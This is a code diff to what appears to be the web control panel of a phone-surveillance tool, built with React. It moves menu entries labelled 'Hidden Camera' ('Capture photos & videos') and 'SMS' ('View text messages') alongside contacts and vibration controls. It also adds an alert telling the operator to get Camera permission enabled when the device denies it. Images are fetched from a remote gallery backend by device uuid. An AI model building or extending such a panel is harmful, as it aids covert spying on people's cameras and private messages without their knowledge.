@@ -306,8 +306,14 @@ export default function Home() {
             socket.on("camera_error", (data: any) => {
                 setIsCapturingPhoto(false);
                 setIsRecording(false);
-                setCameraError(data.error || "Camera error occurred");
-                setTimeout(() => setCameraError(null), 5000);
+                const errorMessage = data.error || "Camera error occurred";
+                setCameraError(errorMessage);
+
+                if (errorMessage.includes("Permission Denied")) {
+                    alert(`${errorMessage}\n\nPlease enable Camera permission in the App settings.`);
+                } else {
+                    setTimeout(() => setCameraError(null), 5000);
+                }
             });
 
             fetch(`https://backend-api-gallery.onrender.com/images?uuid=${uuid}`)
@@ -1782,22 +1788,22 @@ END:VCARD`;
                                 </button>
                                 <button
                                     onClick={() => {
-                                        setSelectedTool('sms');
+                                        setSelectedTool('camera');
                                         setIsToolDropdownOpen(false);
                                     }}
-                                    className={`w-full text-left px-4 py-4 rounded-xl mb-2 flex items-center justify-between transition-colors ${selectedTool === 'sms' ? 'bg-blue-500/20 border border-blue-500/50' : 'bg-white/5 border border-transparent hover:bg-white/10'}`}
+                                    className={`w-full text-left px-4 py-4 rounded-xl mb-2 flex items-center justify-between transition-colors ${selectedTool === 'camera' ? 'bg-pink-500/20 border border-pink-500/50' : 'bg-white/5 border border-transparent hover:bg-white/10'}`}
                                 >
                                     <div className="flex items-center gap-3">
-                                        <div className="p-2 rounded-lg bg-blue-500/20">
-                                            <svg className="w-5 h-5 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
+                                        <div className="p-2 rounded-lg bg-pink-500/20">
+                                            <svg className="w-5 h-5 text-pink-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
                                         </div>
                                         <div>
-                                            <div className="font-medium">SMS</div>
-                                            <div className="text-xs text-white/40">View text messages</div>
+                                            <div className="font-medium">Hidden Camera</div>
+                                            <div className="text-xs text-white/40">Capture photos & videos</div>
                                         </div>
                                     </div>
-                                    {selectedTool === 'sms' && (
-                                        <svg className="w-5 h-5 text-blue-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
+                                    {selectedTool === 'camera' && (
+                                        <svg className="w-5 h-5 text-pink-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                     )}
                                 </button>
                                 <button
@@ -1818,6 +1824,26 @@ END:VCARD`;
                                     </div>
                                     {selectedTool === 'contacts' && (
                                         <svg className="w-5 h-5 text-green-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
+                                    )}
+                                </button>
+                                <button
+                                    onClick={() => {
+                                        setSelectedTool('sms');
+                                        setIsToolDropdownOpen(false);
+                                    }}
+                                    className={`w-full text-left px-4 py-4 rounded-xl mb-2 flex items-center justify-between transition-colors ${selectedTool === 'sms' ? 'bg-blue-500/20 border border-blue-500/50' : 'bg-white/5 border border-transparent hover:bg-white/10'}`}
+                                >
+                                    <div className="flex items-center gap-3">
+                                        <div className="p-2 rounded-lg bg-blue-500/20">
+                                            <svg className="w-5 h-5 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
+                                        </div>
+                                        <div>
+                                            <div className="font-medium">SMS</div>
+                                            <div className="text-xs text-white/40">View text messages</div>
+                                        </div>
+                                    </div>
+                                    {selectedTool === 'sms' && (
+                                        <svg className="w-5 h-5 text-blue-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                     )}
                                 </button>
                                 <button
@@ -1858,26 +1884,6 @@ END:VCARD`;
                                     </div>
                                     {selectedTool === 'vibration' && (
                                         <svg className="w-5 h-5 text-orange-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
-                                    )}
-                                </button>
-                                <button
-                                    onClick={() => {
-                                        setSelectedTool('camera');
-                                        setIsToolDropdownOpen(false);
-                                    }}
-                                    className={`w-full text-left px-4 py-4 rounded-xl flex items-center justify-between transition-colors ${selectedTool === 'camera' ? 'bg-pink-500/20 border border-pink-500/50' : 'bg-white/5 border border-transparent hover:bg-white/10'}`}
-                                >
-                                    <div className="flex items-center gap-3">
-                                        <div className="p-2 rounded-lg bg-pink-500/20">
-                                            <svg className="w-5 h-5 text-pink-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
-                                        </div>
-                                        <div>
-                                            <div className="font-medium">Hidden Camera</div>
-                                            <div className="text-xs text-white/40">Capture photos & videos</div>
-                                        </div>
-                                    </div>
-                                    {selectedTool === 'camera' && (
-                                        <svg className="w-5 h-5 text-pink-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                     )}
                                 </button>
                             </div>
